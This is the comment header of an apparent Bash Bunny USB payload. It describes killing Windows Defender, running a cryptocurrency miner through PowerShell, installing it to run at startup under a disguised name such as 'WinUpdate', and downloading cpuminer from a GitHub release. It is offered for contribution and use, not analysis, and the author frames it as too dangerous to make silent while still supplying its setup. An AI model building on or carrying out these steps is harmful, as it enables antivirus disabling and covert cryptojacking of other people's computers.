# I would like to thank mainly Ar1k88. His payload inspired me to start such a project and i wanted to improve it.
# Also thank you to C1PH3R for letting me use his Anti-AV script.
 
# Description: This payload will immeadiatly run a miner via powershell but will also install the same miner so that it can be used after 
# restart. The payload is not yet complete because AV might detect the miner at boot and remove it.

# Contribution: We hope to see this payload as efficient as possible and add as much features as possible to it. Feel free to
# Edit/Add or Modify anything you see fit and you will be thanked for your contribution!

# How it works: The bunny will start by killing AV (windows defender) and after that it will run a non-silent and then silently install 
# the miner with all its files to your pc for startup.I cannot teach you how to run the miner silently because 
# this payload is too dangerous to be around for script-kiddies to abuse. Please do not add silence when contributing to it.


# Please change the credentials in "config.txt" to this format:
# <algorithim>
# <pool stratum>
# <username/wallet>
# <cores/threads>

# And change the start.bat to your own credentials and "minerd" to the application name(aka WinUpdate/miner/or whatever you named your exe)
# Also You must read and apply what the README file says. Otherwise the payload will not work.

# You will need to go to 
# https://github.com/tpruvot/cpuminer-multi/releases/download/v1.3-multi/cpuminer-multi-rel1.3.zip
# Extract the EXE's and use the x86 (32Bit) version due to it supports both 32Bit and 64Bit CPU.
# Add "cpuminer-x86.exe" and "msvcr120.dll" to the payload folder.
